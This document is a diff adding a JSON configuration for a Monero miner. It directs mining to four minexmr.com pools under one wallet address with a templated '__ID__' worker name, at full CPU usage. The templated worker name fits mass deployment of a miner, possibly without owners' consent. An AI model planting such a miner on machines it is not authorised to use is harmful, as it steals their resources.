@@ -1,0 +1,58 @@
+{
+    "autosave": false,
+    "av": 0,
+    "background": false,
+    "colors": false,
+    "cpu": true,
+    "opencl": false,
+    "cuda": false,
+    "cpu-affinity": null,
+    "cpu-priority": 5,
+    "donate-level": 0,
+    "huge-pages": true,
+    "hw-aes": null,
+    "log-file": null,
+    "max-cpu-usage": 100,
+    "pools": [
+        {
+            "url": "ca.minexmr.com:6666",
+            "coin": "monero",
+            "user": "42RJwGxwrJNGToL3cg1YKs31BUsQen1cr5UJbCdM6rUiVFCBwfJqzgL5fU51UCB5oWFV91Rj1EiPuRvMuyRX4encLXkmdy3.__ID__",
+            "keepalive": true,
+            "variant": -1,
+            "tls": true,
+            "tls-fingerprint": null
+        },{
+            "url": "fr.minexmr.com:6666",
+            "coin": "monero",
+            "user": "42RJwGxwrJNGToL3cg1YKs31BUsQen1cr5UJbCdM6rUiVFCBwfJqzgL5fU51UCB5oWFV91Rj1EiPuRvMuyRX4encLXkmdy3.__ID__",
+            "keepalive": true,
+            "variant": -1,
+            "tls": true,
+            "tls-fingerprint": null
+        },{
+            "url": "de.minexmr.com:6666",
+            "coin": "monero",
+            "user": "42RJwGxwrJNGToL3cg1YKs31BUsQen1cr5UJbCdM6rUiVFCBwfJqzgL5fU51UCB5oWFV91Rj1EiPuRvMuyRX4encLXkmdy3.__ID__",
+            "keepalive": true,
+            "variant": -1,
+            "tls": true,
+            "tls-fingerprint": null
+        },{
+            "url": "sg.minexmr.com:6666",
+            "coin": "monero",
+            "user": "42RJwGxwrJNGToL3cg1YKs31BUsQen1cr5UJbCdM6rUiVFCBwfJqzgL5fU51UCB5oWFV91Rj1EiPuRvMuyRX4encLXkmdy3.__ID__",
+            "keepalive": true,
+            "variant": -1,
+            "tls": true,
+            "tls-fingerprint": null
+        }
+    ],
+    "print-time": 60,
+    "retries": 5,
+    "retry-pause": 5,
+    "safe": false,
+    "user-agent": null,
+    "syslog": false,
+    "watch": false
+}
